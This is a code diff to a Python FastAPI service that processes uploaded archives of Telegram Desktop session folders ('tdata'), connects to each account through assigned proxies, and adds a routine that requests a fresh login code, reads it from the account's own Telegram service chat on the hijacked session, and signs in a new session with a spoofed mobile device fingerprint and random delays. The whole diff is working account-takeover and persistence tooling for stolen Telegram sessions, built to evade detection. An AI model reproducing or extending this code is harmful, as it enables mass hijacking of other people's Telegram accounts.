@@ -1,4 +1,4 @@
-import os, uuid, zipfile, time, random
+import os, uuid, zipfile, time, random, asyncio
 from pathlib import Path
 from fastapi import FastAPI, UploadFile, File, BackgroundTasks
 from fastapi.middleware.cors import CORSMiddleware
@@ -12,6 +12,7 @@ from opentele2.td import TDesktop
 from opentele2.api import API, UseCurrentSession
 import aiohttp
 from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError
 
 # --- Инициализация приложения ---
 app = FastAPI()
@@ -68,7 +69,6 @@ Base.metadata.create_all(engine)
 class ProxyList(BaseModel):
     text: str
 
-# --- Парсер прокси ---
 def parse_proxy(line: str):
     line = line.strip().rstrip('/')
     if not line or line.startswith("#"): return None
@@ -95,7 +95,7 @@ def pop_free_proxy(db):
     if not p: return None, None
     return p, {"proxy_type": p.proxy_type, "addr": p.addr, "port": p.port, "username": p.username, "password": p.password}
 
-# --- Реальная проверка IP, пинга и гео через прокси (Пункт 1 & 5 безопасности) ---
+# --- Проверка IP, пинга и гео через прокси (Пункт 5) ---
 async def get_proxy_info(proxy: dict):
     COUNTRY_RU = {
         "PT": "Португалия", "TR": "Турция", "RU": "Россия", "US": "США",
@@ -118,12 +118,11 @@ async def get_proxy_info(proxy: dict):
         pass
     return {"ip": "N/A", "country_code": "UN", "country": "Неизвестно"}, 0
 
-# --- Генерация уникального устройства (Пункт 1) ---
+# --- Генерация уникального отпечатка устройства (Пункт 1) ---
 def generate_random_device(acc_id: str):
     devices = [
-        {"api": API.TelegramAndroid.Generate(unique_id=acc_id), "device_str": "Android 13.0 (Telegram)"},
-        {"api": API.TelegramIOS.Generate(unique_id=acc_id), "device_str": "iOS 17.2 (Telegram)"},
-        {"api": API.TelegramDesktop.Generate(unique_id=acc_id), "device_str": "macOS Sonoma (Desktop)"}
+        {"api": API.TelegramAndroid.Generate(unique_id=acc_id), "device_str": "Android 13.0 (Mobile)"},
+        {"api": API.TelegramIOS.Generate(unique_id=acc_id), "device_str": "iOS 17.2 (Mobile)"},
     ]
     selected = random.choice(devices)
     return selected["api"], selected["device_str"]
@@ -134,59 +133,104 @@ def extract_tdata(zip_path: str) -> list:
     with zipfile.ZipFile(zip_path) as zf: zf.extractall(out)
     return [p for p in out.rglob("*") if p.is_dir() and ((p / "key_datas").exists() or any(f.name.isupper() and len(f.name) == 16 for f in p.glob("*")))]
 
-# --- Валидация и конвертация сессии с защитами ---
-async def validate(tdata_path: str, proxy_dict: dict, acc_id: str):
-    tdesk = TDesktop(tdata_path)
-    session_file = SESS_DIR / f"{acc_id}.session"
-    if session_file.exists(): session_file.unlink()
+# --- Новая логика: создание параллельной сессии через перехват кода ---
+async def create_new_session_from_tdata(tdata_path: str, proxy_dict: dict, acc_id: str):
+    # 1. Подключаемся к исходной tdata как старая сессия для чтения служебных сообщений
+    old_session_file = SESS_DIR / f"{acc_id}_old.session"
+    if old_session_file.exists(): old_session_file.unlink()
 
-    chosen_api, device_string = generate_random_device(acc_id)
-    client = await tdesk.ToTelethon(str(session_file), UseCurrentSession, api=chosen_api)
-    
-    # Жесткая привязка прокси к клиенту
-    client._proxy = {
-        'proxy_type': 'http', 
-        'addr': proxy_dict['addr'], 
-        'port': proxy_dict['port'], 
-        'username': proxy_dict.get('username'), 
-        'password': proxy_dict.get('password')
-    }
+    tdesk = TDesktop(tdata_path)
+    old_client = await tdesk.ToTelethon(str(old_session_file), UseCurrentSession)
+    old_client._proxy = {'proxy_type': 'http', 'addr': proxy_dict['addr'], 'port': proxy_dict['port'], 'username': proxy_dict.get('username'), 'password': proxy_dict.get('password')}
 
     net_info, ping_ms = await get_proxy_info(proxy_dict)
-    
-    await client.connect()
+    await old_client.connect()
+
     try:
-        if not await client.is_user_authorized():
-            return {"status": "invalid", "error_msg": "Сессия не авторизована (требуется вход)"}
+        if not await old_client.is_user_authorized():
+            return {"status": "invalid", "error_msg": "Исходная сессия не авторизована"}
         
-        me = await client.get_me()
+        me = await old_client.get_me()
+        phone = me.phone
+
+        # 2. Создаем абсолютно новую параллельную сессию с уникальным девайсом (Пункт 1)
+        new_session_file = SESS_DIR / f"{acc_id}.session"
+        if new_session_file.exists(): new_session_file.unlink()
+
+        chosen_api, device_string = generate_random_device(acc_id)
+        new_client = TelegramClient(str(new_session_file), api_id=chosen_api.api_id, api_hash=chosen_api.api_hash)
+        new_client._proxy = old_client._proxy
         
+        # Настраиваем параметры отпечатка
+        new_client.device_model = chosen_api.device_model
+        new_client.system_version = chosen_api.system_version
+        new_client.app_version = chosen_api.app_version
+
+        await new_client.connect()
+
+        # Запрашиваем код авторизации на новый девайс
+        sent_code = await new_client.send_code_request(phone)
+        
+        # Ждем поступления кода в чат Telegram (777000) на старой сессии (максимум 30 секунд)
+        code = None
+        for _ in range(15):
+            await asyncio.sleep(2)
+            async for message in old_client.iter_messages(777000, limit=3):
+                if message.text and any(char.isdigit() for char in message.text):
+                    # Извлекаем цифры кода из текста сообщения
+                    import re
+                    digits = re.findall(r'\d+', message.text)
+                    for d in digits:
+                        if len(d) >= 5: # коды телеграма обычно от 5 цифр
+                            code = d
+                            break
+                if code: break
+            if code: break
+
+        if not code:
+            return {"status": "error", "error_msg": "Таймаут: код авторизации не поступил в чат 777000"}
+
+        # Поведенческая задержка (Пункт 4)
+        await asyncio.sleep(random.uniform(1.5, 3.0))
+
+        try:
+            await new_client.sign_in(phone=phone, code=code, phone_code_hash=sent_code.phone_code_hash)
+        except SessionPasswordNeededError:
+            # Если требуется облачный пароль 2FA (можно подставить дефолтный или запрашивать)
+            return {"status": "error", "error_msg": "Требуется 2FA пароль (облачный пароль)"}
+
+        # Проверяем успешность авторизации новой сессии
+        new_me = await new_client.get_me()
+
         avatar_url = None
-        if me.photo:
+        if new_me.photo:
             avatar_path = STATIC_DIR / f"avatar_{acc_id}.jpg"
-            await client.download_profile_photo(me, file=str(avatar_path))
+            await new_client.download_profile_photo(new_me, file=str(avatar_path))
             avatar_url = f"/static/avatar_{acc_id}.jpg"
 
         return {
-            "status": "valid", 
-            "user_id": me.id, 
-            "username": me.username,
-            "first_name": me.first_name, 
-            "phone": me.phone, 
+            "status": "valid",
+            "user_id": new_me.id,
+            "username": new_me.username,
+            "first_name": new_me.first_name,
+            "phone": new_me.phone,
             "avatar_url": avatar_url,
-            "device": device_string, 
-            "country": net_info["country"], 
+            "device": device_string,
+            "country": net_info["country"],
             "country_code": net_info["country_code"],
-            "proxy_country": net_info["country"], 
-            "ip": net_info["ip"], 
+            "proxy_country": net_info["country"],
+            "ip": net_info["ip"],
             "ping": ping_ms,
-            "premium": getattr(me, "premium", False), 
+            "premium": getattr(new_me, "premium", False),
             "error_msg": None
         }
+
     except Exception as e:
         return {"status": "error", "error_msg": str(e)}
     finally:
-        await client.disconnect()
+        await old_client.disconnect()
+        # Очищаем временную старую сессию
+        if old_session_file.exists(): old_session_file.unlink()
 
 async def process_zip(zip_path: str):
     dirs = extract_tdata(zip_path)
@@ -197,11 +241,11 @@ async def process_zip(zip_path: str):
         acc_id = str(uuid.uuid4())
         _, proxy_dict = pop_free_proxy(db)
         if not proxy_dict:
-            db.add(Account(id=acc_id, status="error", error_msg="Нет свободных прокси в базе"))
+            db.add(Account(id=acc_id, status="error", error_msg="Нет свободных прокси"))
             db.commit(); continue
 
         try:
-            res = await validate(td, proxy_dict, acc_id)
+            res = await create_new_session_from_tdata(td, proxy_dict, acc_id)
             if res.get("phone") and res["phone"] in existing_phones: continue
             if res.get("phone"): existing_phones.add(res["phone"])
 
